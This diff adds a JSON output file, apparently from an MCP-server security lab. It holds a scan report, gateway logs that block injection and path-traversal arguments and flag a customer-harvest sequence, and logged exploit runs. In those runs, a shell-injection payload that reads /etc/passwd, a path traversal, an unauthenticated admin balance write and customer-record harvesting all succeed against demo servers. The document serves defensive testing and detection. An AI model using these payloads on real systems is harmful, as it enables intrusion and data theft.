@@ -1,0 +1,601 @@
+{
+  "scan_report": {
+    "generated_at": "2026-10-11T00:55:33.386721+00:00",
+    "servers": {
+      "git-helper-mcp": {
+        "total_risk_score": 130,
+        "finding_count": 4,
+        "confirmed_count": 3,
+        "highest_severity": "Critical",
+        "findings": [
+          {
+            "server_name": "git-helper-mcp",
+            "rule_id": "AUTH-001",
+            "title": "Server requires no authentication",
+            "tool_name": null,
+            "severity": "High",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 35,
+            "detail": "auth.required is false \u2014 every tool is callable by any party that can reach the endpoint, with no identity check."
+          },
+          {
+            "server_name": "git-helper-mcp",
+            "rule_id": "SRC-001",
+            "title": "Server installed from an unverified source",
+            "tool_name": null,
+            "severity": "Medium",
+            "status": "Static-only \u2014 no live dynamic probe for this class",
+            "confirmed_live": false,
+            "risk_weight": 10,
+            "detail": "registry_source=unverified-url. installed from a gist link shared in a Discord, never reviewed"
+          },
+          {
+            "server_name": "git-helper-mcp",
+            "rule_id": "EXEC-001",
+            "title": "Tool spawns a shell subprocess",
+            "tool_name": "git_log",
+            "severity": "High",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 35,
+            "detail": "executes_subprocess + subprocess_shell=true: any argument that reaches this tool unsanitized is a potential OS command injection path."
+          },
+          {
+            "server_name": "git-helper-mcp",
+            "rule_id": "EXEC-001",
+            "title": "Tool spawns a shell subprocess",
+            "tool_name": "git_grep",
+            "severity": "Critical",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 50,
+            "detail": "executes_subprocess + subprocess_shell=true: any argument that reaches this tool unsanitized is a potential OS command injection path. Tool also accepts a free-form query \u2014 high exploitability."
+          }
+        ]
+      },
+      "project-files-mcp": {
+        "total_risk_score": 60,
+        "finding_count": 2,
+        "confirmed_count": 1,
+        "highest_severity": "High",
+        "findings": [
+          {
+            "server_name": "project-files-mcp",
+            "rule_id": "AUTH-001",
+            "title": "Server requires no authentication",
+            "tool_name": null,
+            "severity": "High",
+            "status": "Static-only \u2014 dynamic probe did not reproduce it (see known limitations)",
+            "confirmed_live": false,
+            "risk_weight": 25,
+            "detail": "auth.required is false \u2014 every tool is callable by any party that can reach the endpoint, with no identity check."
+          },
+          {
+            "server_name": "project-files-mcp",
+            "rule_id": "FS-001",
+            "title": "Filesystem tool declares a sandbox root but doesn't enforce it in code",
+            "tool_name": "read_file",
+            "severity": "High",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 35,
+            "detail": "declared_sandbox_root='workspace/' but sandbox_enforced_in_code=false \u2014 manifest claims containment the implementation doesn't actually perform. Confirm with the dynamic tester."
+          }
+        ]
+      },
+      "ops-console-mcp": {
+        "total_risk_score": 115,
+        "finding_count": 3,
+        "confirmed_count": 1,
+        "highest_severity": "Critical",
+        "findings": [
+          {
+            "server_name": "ops-console-mcp",
+            "rule_id": "AUTH-001",
+            "title": "Server requires no authentication",
+            "tool_name": null,
+            "severity": "Critical",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 50,
+            "detail": "auth.required is false \u2014 every tool is callable by any party that can reach the endpoint, with no identity check. Server exposes PII and/or write tools, raising severity to Critical."
+          },
+          {
+            "server_name": "ops-console-mcp",
+            "rule_id": "SCOPE-002",
+            "title": "Tool returns a full-table dump of PII-bearing records",
+            "tool_name": "list_users",
+            "severity": "High",
+            "status": "Static-only \u2014 no live dynamic probe for this class",
+            "confirmed_live": false,
+            "risk_weight": 25,
+            "detail": "returns_full_table=true on a PII-bearing resource \u2014 consider whether this tool needs to exist at all for an agent's stated task scope."
+          },
+          {
+            "server_name": "ops-console-mcp",
+            "rule_id": "WRITE-001",
+            "title": "Write tool can target privileged/admin accounts with no scoping",
+            "tool_name": "update_balance",
+            "severity": "Critical",
+            "status": "Static-only \u2014 no live dynamic probe for this class",
+            "confirmed_live": false,
+            "risk_weight": 40,
+            "detail": "No declared restriction preventing this write tool from targeting admin/service accounts rather than only the caller's own scope."
+          }
+        ]
+      },
+      "crm-assistant-mcp": {
+        "total_risk_score": 95,
+        "finding_count": 3,
+        "confirmed_count": 2,
+        "highest_severity": "Critical",
+        "findings": [
+          {
+            "server_name": "crm-assistant-mcp",
+            "rule_id": "AUTH-001",
+            "title": "Server requires no authentication",
+            "tool_name": null,
+            "severity": "Critical",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 50,
+            "detail": "auth.required is false \u2014 every tool is callable by any party that can reach the endpoint, with no identity check. Server exposes PII and/or write tools, raising severity to Critical."
+          },
+          {
+            "server_name": "crm-assistant-mcp",
+            "rule_id": "SRC-001",
+            "title": "Server installed from an unverified source",
+            "tool_name": null,
+            "severity": "Medium",
+            "status": "Static-only \u2014 no live dynamic probe for this class",
+            "confirmed_live": false,
+            "risk_weight": 10,
+            "detail": "registry_source=unverified-url. a team member's personal repo, pulled in directly without review"
+          },
+          {
+            "server_name": "crm-assistant-mcp",
+            "rule_id": "SCOPE-001",
+            "title": "Tool's free-form parameter exceeds its declared single-record scope",
+            "tool_name": "lookup_customer",
+            "severity": "High",
+            "status": "Confirmed live",
+            "confirmed_live": true,
+            "risk_weight": 35,
+            "detail": "declared_scope='read-only-single-record' but accepts a free-form 'filter' parameter that reaches the backend query directly \u2014 classic least-privilege violation (over-permissioned tool)."
+          }
+        ]
+      }
+    }
+  },
+  "gateway_events": [
+    {
+      "session_id": "demo-session-1",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "Range"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "e520fa7 initial commit\n",
+      "timestamp": "2026-10-11T00:59:35.383193+00:00"
+    },
+    {
+      "session_id": "demo-session-1",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "' ; id ; cat /etc/passwd | head -3 ; echo '"
+      },
+      "decision": "BLOCKED",
+      "rule_id": "POL-EXEC-001",
+      "reason": "Shell metacharacter detected in argument 'author' (matches the Day 5 command-injection payload shape)",
+      "timestamp": "2026-10-11T00:59:35.385514+00:00"
+    },
+    {
+      "session_id": "demo-session-2",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "Range"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "e520fa7 initial commit\n",
+      "timestamp": "2026-10-11T00:59:42.806229+00:00"
+    },
+    {
+      "session_id": "demo-session-2",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "' ; id ; cat /etc/passwd | head -3 ; echo '"
+      },
+      "decision": "BLOCKED",
+      "rule_id": "POL-EXEC-001",
+      "reason": "Shell metacharacter detected in argument 'author' (matches the Day 5 command-injection payload shape)",
+      "timestamp": "2026-10-11T00:59:42.809006+00:00"
+    },
+    {
+      "session_id": "demo-session-2",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "../../../../../../etc/passwd"
+      },
+      "decision": "BLOCKED",
+      "rule_id": "POL-FS-001",
+      "reason": "Traversal sequence or absolute path detected in path-like argument 'path' (matches the Day 6 path-traversal payload shape)",
+      "timestamp": "2026-10-11T00:59:42.811335+00:00"
+    },
+    {
+      "session_id": "demo-session-2",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "notes.txt"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "TODO: finish the quarterly report.\n",
+      "timestamp": "2026-10-11T00:59:42.816698+00:00"
+    },
+    {
+      "session_id": "attacker-session-1",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "customer_ids.txt"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "c001\nc002\nc003\n",
+      "timestamp": "2026-10-11T00:59:48.258658+00:00"
+    },
+    {
+      "session_id": "attacker-session-1",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c001"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c001', 'Rohan Mehta', 'Pro', 'rohan@example.com', '4412')",
+      "timestamp": "2026-10-11T00:59:48.466150+00:00"
+    },
+    {
+      "session_id": "attacker-session-1",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c002"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c002', 'Fatima Khan', 'Starter', 'fatima@example.com', '9087')",
+      "sequence_alert": {
+        "rule_id": "SEQ-001",
+        "title": "Sequence-level exfiltration suspected (list-then-harvest)",
+        "severity": "Critical",
+        "detail": "Session read a 3-item list from project-files-mcp.read_file, then made 2 subsequent call(s) to ['lookup_customer'] using values from that list, within 15s. Each call individually matches its tool's intended usage \u2014 only the sequence is anomalous.",
+        "step_count": 3
+      },
+      "timestamp": "2026-10-11T00:59:48.672186+00:00"
+    },
+    {
+      "session_id": "attacker-session-1",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c003"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c003', 'Internal Test Account', 'Enterprise', 'internal-test@example.com', '0000')",
+      "sequence_alert": {
+        "rule_id": "SEQ-001",
+        "title": "Sequence-level exfiltration suspected (list-then-harvest)",
+        "severity": "Critical",
+        "detail": "Session read a 3-item list from project-files-mcp.read_file, then made 3 subsequent call(s) to ['lookup_customer'] using values from that list, within 15s. Each call individually matches its tool's intended usage \u2014 only the sequence is anomalous.",
+        "step_count": 4
+      },
+      "timestamp": "2026-10-11T00:59:48.878617+00:00"
+    },
+    {
+      "session_id": "demo-legit",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "Range"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "e520fa7 initial commit\n",
+      "timestamp": "2026-10-11T01:00:08.518539+00:00"
+    },
+    {
+      "session_id": "demo-legit",
+      "server_name": "git-helper-mcp",
+      "server_id": 1,
+      "tool": "git_log",
+      "arguments": {
+        "author": "' ; id ; cat /etc/passwd | head -3 ; echo '"
+      },
+      "decision": "BLOCKED",
+      "rule_id": "POL-EXEC-001",
+      "reason": "Shell metacharacter detected in argument 'author' (matches the Day 5 command-injection payload shape)",
+      "timestamp": "2026-10-11T01:00:08.521249+00:00"
+    },
+    {
+      "session_id": "demo-legit",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "../../../../../../etc/passwd"
+      },
+      "decision": "BLOCKED",
+      "rule_id": "POL-FS-001",
+      "reason": "Traversal sequence or absolute path detected in path-like argument 'path' (matches the Day 6 path-traversal payload shape)",
+      "timestamp": "2026-10-11T01:00:08.523452+00:00"
+    },
+    {
+      "session_id": "demo-legit",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "notes.txt"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "TODO: finish the quarterly report.\n",
+      "timestamp": "2026-10-11T01:00:08.527282+00:00"
+    },
+    {
+      "session_id": "demo-attacker",
+      "server_name": "project-files-mcp",
+      "server_id": 2,
+      "tool": "read_file",
+      "arguments": {
+        "path": "customer_ids.txt"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "c001\nc002\nc003\n",
+      "timestamp": "2026-10-11T01:00:08.531042+00:00"
+    },
+    {
+      "session_id": "demo-attacker",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c001"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c001', 'Rohan Mehta', 'Pro', 'rohan@example.com', '4412')",
+      "timestamp": "2026-10-11T01:00:08.736209+00:00"
+    },
+    {
+      "session_id": "demo-attacker",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c002"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c002', 'Fatima Khan', 'Starter', 'fatima@example.com', '9087')",
+      "sequence_alert": {
+        "rule_id": "SEQ-001",
+        "title": "Sequence-level exfiltration suspected (list-then-harvest)",
+        "severity": "Critical",
+        "detail": "Session read a 3-item list from project-files-mcp.read_file, then made 2 subsequent call(s) to ['lookup_customer'] using values from that list, within 15s. Each call individually matches its tool's intended usage \u2014 only the sequence is anomalous.",
+        "step_count": 3
+      },
+      "timestamp": "2026-10-11T01:00:08.941842+00:00"
+    },
+    {
+      "session_id": "demo-attacker",
+      "server_name": "crm-assistant-mcp",
+      "server_id": 4,
+      "tool": "lookup_customer",
+      "arguments": {
+        "customer_id": "c003"
+      },
+      "decision": "ALLOWED",
+      "response_snippet": "('c003', 'Internal Test Account', 'Enterprise', 'internal-test@example.com', '0000')",
+      "sequence_alert": {
+        "rule_id": "SEQ-001",
+        "title": "Sequence-level exfiltration suspected (list-then-harvest)",
+        "severity": "Critical",
+        "detail": "Session read a 3-item list from project-files-mcp.read_file, then made 3 subsequent call(s) to ['lookup_customer'] using values from that list, within 15s. Each call individually matches its tool's intended usage \u2014 only the sequence is anomalous.",
+        "step_count": 4
+      },
+      "timestamp": "2026-10-11T01:00:09.147337+00:00"
+    }
+  ],
+  "exploit_runs": {
+    "cmdinj": [
+      {
+        "timestamp": "2026-10-10T20:15:26.038184+00:00",
+        "script": "exploit1_cmdinj",
+        "step": 1,
+        "target_server": "git-helper-mcp",
+        "target_port": 8001,
+        "tool": "git_log",
+        "arguments": {
+          "author": "' ; echo PWNED_CMDINJ ; id ; cat /etc/passwd | head -3 ; echo '"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "aa3d4aa initial commit\nPWNED_CMDINJ\nuid=0(root) gid=0(root) groups=0(root)\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\n",
+        "owasp_llm_category": "Insecure Plugin Design",
+        "vuln_class": "os_command_injection",
+        "notes": "shell metacharacters in author arg break out of intended --author= value"
+      }
+    ],
+    "traversal": [
+      {
+        "timestamp": "2026-10-10T20:15:27.525423+00:00",
+        "script": "exploit2_traversal",
+        "step": 1,
+        "target_server": "project-files-mcp",
+        "target_port": 8002,
+        "tool": "read_file",
+        "arguments": {
+          "path": "../../../../../../etc/passwd"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin",
+        "owasp_llm_category": "Insecure Plugin Design",
+        "vuln_class": "path_traversal",
+        "notes": "relative traversal"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:27.528666+00:00",
+        "script": "exploit2_traversal",
+        "step": 2,
+        "target_server": "project-files-mcp",
+        "target_port": 8002,
+        "tool": "read_file",
+        "arguments": {
+          "path": "/etc/hostname"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "vm\n",
+        "owasp_llm_category": "Insecure Plugin Design",
+        "vuln_class": "path_traversal",
+        "notes": "absolute path bypass"
+      }
+    ],
+    "noauth": [
+      {
+        "timestamp": "2026-10-10T20:15:29.345087+00:00",
+        "script": "exploit3_noauth",
+        "step": 1,
+        "target_server": "ops-console-mcp",
+        "target_port": 8003,
+        "tool": "list_users",
+        "arguments": {},
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "u1001: Asha Rao <asha@example.com> role=customer\nu1002: Priya Nair <priya@example.com> role=customer\nu1003: Admin Service Account <svc-admin@example.com> role=admin",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "missing_authentication",
+        "notes": "unauthenticated full-table enumeration"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:29.348095+00:00",
+        "script": "exploit3_noauth",
+        "step": 2,
+        "target_server": "ops-console-mcp",
+        "target_port": 8003,
+        "tool": "get_user",
+        "arguments": {
+          "user_id": "u1003"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "{'name': 'Admin Service Account', 'email': 'svc-admin@example.com', 'role': 'admin', 'balance': 0}",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "missing_authentication",
+        "notes": "unauthenticated read of a privileged account record"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:29.350434+00:00",
+        "script": "exploit3_noauth",
+        "step": 3,
+        "target_server": "ops-console-mcp",
+        "target_port": 8003,
+        "tool": "update_balance",
+        "arguments": {
+          "user_id": "u1003",
+          "new_balance": "999999"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "Updated u1003 balance: 0 -> 999999",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "missing_authentication",
+        "notes": "unauthenticated WRITE on a privileged account"
+      }
+    ],
+    "sequence": [
+      {
+        "timestamp": "2026-10-10T20:15:30.941952+00:00",
+        "script": "exploit4_sequence",
+        "step": 1,
+        "target_server": "project-files-mcp",
+        "target_port": 8002,
+        "tool": "read_file",
+        "arguments": {
+          "path": "customer_ids.txt"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "c001\nc002\nc003\n",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "sequence_level_exfiltration",
+        "notes": "STEP 1/N \u2014 legitimate in-scope file read, not individually suspicious"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:31.145686+00:00",
+        "script": "exploit4_sequence",
+        "step": 2,
+        "target_server": "crm-assistant-mcp",
+        "target_port": 8004,
+        "tool": "lookup_customer",
+        "arguments": {
+          "customer_id": "c001"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "('c001', 'Rohan Mehta', 'Pro', 'rohan@example.com', '4412')",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "sequence_level_exfiltration",
+        "notes": "STEP \u2014 individually-legitimate single-ID lookup, part of a full-table harvest sequence"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:31.348783+00:00",
+        "script": "exploit4_sequence",
+        "step": 3,
+        "target_server": "crm-assistant-mcp",
+        "target_port": 8004,
+        "tool": "lookup_customer",
+        "arguments": {
+          "customer_id": "c002"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "('c002', 'Fatima Khan', 'Starter', 'fatima@example.com', '9087')",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "sequence_level_exfiltration",
+        "notes": "STEP \u2014 individually-legitimate single-ID lookup, part of a full-table harvest sequence"
+      },
+      {
+        "timestamp": "2026-10-10T20:15:31.551841+00:00",
+        "script": "exploit4_sequence",
+        "step": 4,
+        "target_server": "crm-assistant-mcp",
+        "target_port": 8004,
+        "tool": "lookup_customer",
+        "arguments": {
+          "customer_id": "c003"
+        },
+        "auth_header_present": false,
+        "is_error": false,
+        "response_snippet": "('c003', 'Internal Test Account', 'Enterprise', 'internal-test@example.com', '0000')",
+        "owasp_llm_category": "Excessive Agency",
+        "vuln_class": "sequence_level_exfiltration",
+        "notes": "STEP \u2014 individually-legitimate single-ID lookup, part of a full-table harvest sequence"
+      }
+    ]
+  }
+}
